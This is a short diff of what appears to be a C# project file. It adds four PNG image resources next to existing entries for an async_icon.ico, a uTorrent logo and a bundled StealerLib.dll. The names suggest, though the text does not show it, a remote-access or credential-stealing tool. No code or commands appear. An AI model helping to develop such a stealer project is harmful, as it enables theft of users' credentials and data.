@@ -267,6 +267,10 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="async_icon.ico" />
+    <None Include="Resources\system.png" />
+    <None Include="Resources\extra.png" />
+    <None Include="Resources\Miscellaneous.png" />
+    <None Include="Resources\monitoring-system.png" />
     <None Include="Resources\u-torrent-logo.png" />
     <None Include="Resources\StealerLib.dll" />
     <None Include="Resources\report.png" />
